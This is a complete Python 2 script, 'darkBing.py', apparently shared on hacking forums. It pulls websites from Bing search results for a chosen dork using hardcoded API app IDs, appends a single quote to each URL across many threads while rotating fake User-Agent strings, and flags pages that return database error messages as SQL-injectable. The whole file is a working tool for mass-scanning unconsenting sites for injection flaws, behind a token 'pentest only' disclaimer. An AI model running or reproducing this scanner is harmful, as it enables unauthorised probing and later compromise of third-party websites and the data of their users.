#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# Toolname        : darkBing.py
# Coder           : baltazar a.k.a b4ltazar < b4ltazar@gmail.com>
# Version         : 0.1
# Greetz for rsauron and low1z, great python coders
# greetz for d3hydr8, r45c4l, qk, fx0, Soul, MikiSoft, c0ax, b0ne, tek0t and all members of ex darkc0de.com & ljuska.org

import sys, subprocess, re, Queue, urllib, urllib2, threading, random
from xml.dom import minidom
from optparse import OptionParser
from time import sleep


def logo():
	print "\n|---------------------------------------------------------------|"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   03/2012     darkBing.py  v.0.1                              |"
        print "|    b4ltazar.wordpress.com     &      ljuska.org               |"
        print "|                                                               |"
        print "|---------------------------------------------------------------|\n"
        

if sys.platform == 'linux' or sys.platform == 'linux2':
  subprocess.call("clear", shell=True)
  logo()
else:
  subprocess.call("cls", shell=True)
  logo()

threads = []
urls = []
vuln = []
pager = 50
counter = 0
  
header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
          'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
          'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	  'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	  'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	  'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	  'Opera/8.00 (Windows NT 5.1; U; en)',
	  'amaya/9.51 libwww/5.4.0',
	  'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	  'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	  'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']

sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found'}
  
parser = OptionParser()

parser.add_option("-d", dest="dork", help="Dork for search", type="string")
parser.add_option("-c", dest="scan", help="Number of links to collect", type="int")
parser.add_option("-t", dest="nthreads", help="Number of threads", type="int")

try:
  (options, args) = parser.parse_args()
  if options.dork != None:
    dork = options.dork
  else:
    parser.print_help()
    sys.exit(1)
    
  if options.scan != None:
    pager = options.scan
  else:
    parser.print_help()
    sys.exit(1)
    
  if options.nthreads != None:
    nthreads = options.nthreads
  else:
    parser.print_help()
    sys.exit(1)
    
except(KeyboardInterrupt):
  print "[-] Exiting, thanx for using tool, please visit ljuska.org & darkartists.info"
  sys.exit(1)
  
  
def search(dork, page):
  global urls
  
  appids = ['01CDBCA91C590493EE4E91FAF83E5239FEF6ADFD', 'C2B36F733D8DCB48CE2E075CC145014122BE4724']
  appid = random.choice(appids)
  url = 'http://api.search.live.net/xml.aspx?Appid=%s&query=%s&sources=web&market=en-us&web.count=50&web.offset=%s' % (appid, urllib.quote(dork), str(page))
  url_open = urllib2.urlopen(url)
  xml = minidom.parse(url_open)
  name = xml.getElementsByTagName('web:Url')
  for n in name:
    urls.append(n.childNodes[0].data)
  

class vulnScanner(threading.Thread):
  def __init__(self, queue):
    self.__queue = queue
    threading.Thread.__init__(self)
    
  def run(self):
    global counter
    while True:
      url = self.__queue.get()
      if url is None:
	break
      
      host = url+"'"
      try:
	request_web = urllib2.Request(host)
	agent = random.choice(header)
	request_web.add_header('User-Agent', agent)
	source = urllib2.urlopen(request_web).read()
	for type, eMSG in sqlerrors.items():
	  if re.search(eMSG, source):
	    if not url in vuln:
	      print "[!] w00t,w00t!: ", host,"Error: ",type, " ---> SQL Injection Found"
	      vuln.append(url)
      
      except(KeyboardInterrupt):
	print "[-] Exiting, thanx for using tool, please visit ljuska.org & darkartists.info"
	sys.exit(1)
      except:
	pass
      
      counter += 1
      
def startThreads():
  queue = Queue.Queue(0)
  for i in range(nthreads):
    scan = vulnScanner(queue).start()
    
  for i in range(len(urls)):
    queue.put(urls[i])
    
  for i in range(nthreads):
    queue.put(None)
    
if __name__ == "__main__":
  try:
    print "[!] Dork: %s" % dork
    print "[!] Sites to scan: %s" % pager
    print "[!] Number of threads: %s" % nthreads
  
  
    for i in range(0, (pager / 50)):
      search(dork, 1+i)
    print "[!] Number of collected urls: %s\n" % len(urls)
    startThreads()
    while counter < len(urls):
      sleep(1)
    print "\n[!] Vulnerable urls found: %s" % len(vuln)
    print "[-] Exiting, thanx for using tool, please visit ljuska.org & darkartists.info"
    sys.exit(1)
  except(KeyboardInterrupt):
    print "[-] Exiting, thanx for using tool, please visit ljuska.org & darkartists.info"
    sys.exit(1)
  
	
	
